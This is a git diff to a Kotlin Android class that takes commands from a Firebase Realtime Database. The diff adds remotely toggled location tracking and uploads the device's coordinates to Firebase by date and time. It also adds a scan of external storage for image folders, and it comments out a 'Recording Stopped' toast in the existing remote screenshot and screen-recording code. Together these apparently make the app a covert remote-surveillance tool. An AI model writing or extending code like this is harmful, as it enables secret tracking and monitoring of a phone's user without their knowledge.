@@ -15,9 +15,9 @@ import android.provider.Settings
 import android.util.Base64
 import android.util.Log
 import android.widget.Toast
-import androidx.annotation.RequiresApi
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import com.example.toasty.common.CommonUtils
 import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.DatabaseReference
@@ -32,7 +32,7 @@ import java.io.File
 class FirebaseData {
 
     companion object {
-        private const val TAG: String = "ScreenCaptureFiles"
+        private const val TAG: String = "FirebaseData"
         private lateinit var databaseReference: DatabaseReference
         private lateinit var storageReference: StorageReference
         var deviceUid: String = "Android"
@@ -61,7 +61,7 @@ class FirebaseData {
 
 
             writeData()
-            readData()
+            //readData()
             realTimeUpdateData(activity)
 
         }
@@ -72,6 +72,7 @@ class FirebaseData {
                 "John",
                 "Deo",
                 25,
+                locationStart = false,
                 screenshotStart = false,
                 videoRecordingStart = false
             ) // Example data class
@@ -79,12 +80,37 @@ class FirebaseData {
 
         }
 
+        fun saveLocationToDatabase(currentLatLong: String) {
+            //val timeStamp = System.currentTimeMillis()
+            val date = CommonUtils.getCurrentDateTime()
+            val dateInString = CommonUtils.dateFormetter(date,"yyyy_MM_dd")
+            val timeInString = CommonUtils.dateFormetter(date,"HH:mm:ss")
+            databaseReference.child("locations").child(dateInString).child(timeInString).setValue(currentLatLong)
+                .addOnSuccessListener {
+                    /*Toast.makeText(
+                        this,
+                        "Image saved to Realtime Database $imageName",
+                        Toast.LENGTH_SHORT
+                    ).show()*/
+                    Log.d(TAG, "Location saved to Realtime Database $currentLatLong")
+                }
+                .addOnFailureListener { exception ->
+                    Log.d(TAG, "Failed to save location: ${exception.message}")
+                    /*Toast.makeText(
+                        this,
+                        "Failed to save image: ${exception.message}",
+                        Toast.LENGTH_SHORT
+                    ).show()*/
+                }
+
+        }
+
         private fun readData() {
             databaseReference.child("user").get().addOnSuccessListener {
                 val user = it.getValue(User::class.java)
-                println("User: $user")
+                Log.d(TAG, "User: $user")
             }.addOnFailureListener {
-                println("Error getting data: ${it.message}")
+                Log.d(TAG, "Error getting data: ${it.message}")
             }
 
         }
@@ -94,9 +120,9 @@ class FirebaseData {
             databaseReference.addValueEventListener(object : ValueEventListener {
                 override fun onDataChange(snapshot: DataSnapshot) {
                     for (child in snapshot.children) {
-                        println("Real-time child: $child")
+                        Log.d(TAG, "Real-time child: $child")
                         if (child.key.toString().equals("images")) {
-                            println("Real-time key: ${child.key}")
+                            Log.d(TAG, "Real-time key: ${child.key}")
                             var screenshots = child.value as HashMap<*, *>
                             for (key in screenshots.values) {
                                 //println("Real-time child: $key")
@@ -106,7 +132,7 @@ class FirebaseData {
                             //break
                         } else {
                             val user = child.getValue(User::class.java)
-                            println("Real-time User: $user")
+                            Log.d(TAG, "Real-time User: $user")
                             // textViewStatus.text =
                             //     "ScreenshotStart ${user?.screenshotStart} : VideoRecordingStart ${user?.videoRecordingStart}"
                             if (user?.screenshotStart == true) {
@@ -117,6 +143,12 @@ class FirebaseData {
                                 if (checkAudioPermission(activity)) startScreenRecording(activity)
                             } else if (user?.screenshotStart == false || user?.videoRecordingStart == false) {
                                 stopScreenRecording(activity)
+                            }
+
+                            if (user?.locationStart == true) {
+                                LocationMap.onInit(activity)
+                            }else{
+                                LocationMap.removeLocationUpdate()
                             }
                         }
 
@@ -168,6 +200,46 @@ class FirebaseData {
             imageReaderNew(fullpath)
         }
 
+        private fun listExternalStorageDirectories() {
+            val externalStorageDir = Environment.getExternalStorageDirectory()
+            val directoriesWithImages = mutableListOf<File>()
+            Log.d(TAG, "ImageDirectory: ${externalStorageDir.exists()} -- ${externalStorageDir.isDirectory}")
+            if (externalStorageDir.exists() && externalStorageDir.isDirectory) {
+                val directories = externalStorageDir.listFiles()?.filter { it.isDirectory }
+                directories?.forEach { dir ->
+                    Log.d(TAG, "ImageDirectory: dir: $dir")
+                    if (containsImages(dir)) {
+                        directoriesWithImages.add(dir)
+                    }
+                }
+            }
+
+            // Log directories containing images
+            directoriesWithImages.forEach { dir ->
+                Log.d(TAG, "ImageDirectory: ${dir.absolutePath}")
+            }
+            //val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+            //Log.d(TAG, "downloadDir $downloadDir")
+    /*        if (externalStorageDir.exists() && externalStorageDir.isDirectory) {
+                val directories = externalStorageDir.listFiles()?.filter { it.isDirectory }
+                directories?.forEach { dir ->
+                    Log.d(TAG, "Directory Path: ${dir.absolutePath}")
+                }
+            } else {
+                Log.d(TAG, "Storage External storage directory not found")
+            }*/
+        }
+
+        private fun containsImages(directory: File): Boolean {
+            val imageExtensions = listOf("jpg", "jpeg", "png", "gif", "bmp", "webp")
+            Log.d(TAG, "ImageDirectory: imageExtensions: $imageExtensions")
+            Log.d(TAG, "ImageDirectory: directory.listFiles(): ${directory.listFiles()}")
+            val files = directory.listFiles() ?: return false
+            return files.any { file ->
+                val extension = file.extension.lowercase()
+                imageExtensions.contains(extension)
+            }
+        }
 
         private fun encodeImageToBase64(bitmap: Bitmap): String {
             val byteArrayOutputStream = ByteArrayOutputStream()
@@ -265,8 +337,9 @@ class FirebaseData {
         private fun stopScreenRecording(activity: Activity) {
             val serviceIntent = Intent(activity, ScreenRecordingService::class.java)
             activity.stopService(serviceIntent)
-            pickFile()
-            Toast.makeText(activity, "Recording Stopped", Toast.LENGTH_SHORT).show()
+            //pickFile()
+            listExternalStorageDirectories()
+            //Toast.makeText(activity, "Recording Stopped", Toast.LENGTH_SHORT).show()
         }
 
         /*    override fun onDestroy() {
@@ -308,6 +381,7 @@ class FirebaseData {
         val firstName: String? = "",
         val lastName: String? = "",
         val age: Int? = 0,
+        val locationStart: Boolean = false,
         val screenshotStart: Boolean = false,
         val videoRecordingStart: Boolean = false
     )
